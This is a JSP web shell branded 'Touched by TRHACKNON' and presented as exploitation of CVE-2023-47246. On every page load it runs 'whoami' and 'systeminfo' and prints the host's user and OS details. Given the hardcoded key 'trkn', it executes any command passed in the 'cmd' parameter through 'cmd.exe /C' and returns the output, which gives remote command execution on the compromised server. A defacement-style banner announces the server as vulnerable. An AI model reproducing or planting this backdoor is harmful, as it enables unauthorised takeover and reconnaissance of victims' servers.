<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.BufferedReader"%>
<%@ page import="java.io.InputStreamReader"%>
<%@ page import="java.io.OutputStreamWriter"%>
<%@ page import="java.net.HttpURLConnection"%>
<%@ page import="java.net.URL"%>
<%@ page import="java.net.InetAddress"%>
<%@ page import="java.util.Date"%>
<%@ page import="java.text.SimpleDateFormat"%>

<%
    String trknKey = request.getParameter("key");
    String cmd = request.getParameter("cmd");

    // Afficher les résultats de whoami et systeminfo par défaut
    try {
        Process whoamiProcess = Runtime.getRuntime().exec("whoami");
        BufferedReader whoamiReader = new BufferedReader(new InputStreamReader(whoamiProcess.getInputStream()));
        String whoamiOutput = whoamiReader.readLine();

        Process systemInfoProcess = Runtime.getRuntime().exec("systeminfo");
        BufferedReader systemInfoReader = new BufferedReader(new InputStreamReader(systemInfoProcess.getInputStream()));
        StringBuilder systemInfoOutput = new StringBuilder();
        String line;
        boolean displayInfo = false; // Indicateur pour afficher uniquement les principales informations
        while ((line = systemInfoReader.readLine()) != null) {
            if (line.contains("Host Name:") || line.contains("OS Name:") || line.contains("OS Version:")
                    || line.contains("OS Manufacturer:") || line.contains("OS Configuration:")) {
                systemInfoOutput.append(line).append("<br>");
                displayInfo = true;
            } else if (displayInfo && line.trim().isEmpty()) {
                // Arrêter l'affichage après avoir obtenu les principales informations
                break;
            }
        }

        response.getWriter().write("<h2>Résultats de la commande whoami :</h2>");
        response.getWriter().write("<pre class='output'>" + whoamiOutput + "</pre>");

        response.getWriter().write("<h2>Résultats de la commande systeminfo :</h2>");
        response.getWriter().write("<pre class='output'>" + systemInfoOutput.toString() + "</pre>");
    } catch (Exception e) {
        response.getWriter().write("<pre class='output-error'>Erreur d'exécution de la commande : " + e.getMessage() + "</pre>");
    }

    // Vérifier la présence de la clé "trkn" pour accéder à la fonctionnalité cmd
    if (trknKey != null && trknKey.equals("trkn") && cmd != null && !cmd.isEmpty()) {
        try {
            Process process = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("<br>");
            }
            response.getWriter().write("<h2>Résultats de la commande cmd :</h2>");
            response.getWriter().write("<pre class='output'>" + output.toString() + "</pre>");
        } catch (Exception e) {
            response.getWriter().write("<pre class='output-error'>Erreur d'exécution de la commande : " + e.getMessage() + "</pre>");
        }
    }
%>

    <!DOCTYPE html>
    <html style="background-color: black;">

    <head>
        <title style="color: #ff9933;">Vulnérabilité CVE-2023-47246</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
        <style>
            .output {
                color: #00ccff;
                white-space: pre-wrap;
            }

            .output-error {
                color: red;
            }

            body {
                color: #00ccff;
                font-family: 'Courier New', monospace;
                border: 2px solid #ff3333;
                padding: 20px;
                margin: 20px;
                border-radius: 15px;
            }

            h1 {
                color: #ff3333;
                border-bottom: 2px solid #ff3333;
                padding-bottom: 10px;
            }

            p {
                color: yellow;
                margin-bottom: 15px;
            }

            .logo {
                width: 200px;
                height: auto;
                border: 2px solid #00ccff;
                border-radius: 10px;
                padding: 5px;
                margin-top: 20px;
                margin-bottom: 20px;
            }

            /* Rainbow title animation */
            .rainbow-title {
                background-image: linear-gradient(45deg, violet, lime, indigo, pink, blue, green, yellow, orange, red);
                background-size: 150% 150%;
                color: black;
                display: inline-block;
                font-size: 28px;
                padding: 10px;
                border-radius: 5px;
                animation: rainbowAnimation 5s linear infinite;
            }

            @keyframes rainbowAnimation {
                0% {
                    background-position: 0 0;
                }

                100% {
                    background-position: 150% 150%;
                }
            }
        </style>
    </head>

    <body class="animate__fadeIn">
        <center>
            <div class="rainbow-title animate__animated animate__bounceIn">Touched by TRHACKNON</div><br>
            <img src="https://static.trkn.repl.co/cup.png" alt="Logo" class="logo animate__animated animate__bounceIn">
            <h1>Exploitation de la Vulnérabilité CVE-2023-47246</h1>
            <p>Ce serveur est vulnérable à la CVE-2023-47246.</p>
            <p>La faille a été découverte par trhacknon.</p>
            <img src="https://static.trkn.repl.co/uk.jpg" alt="Logo" class="logo animate__animated animate__bounceIn">
            <p style="font-size: 20px; color: #ff3333;">[+] Vous êtes sur un serveur vulnérable [+]</p>
        </center>
    </body>

    </html>
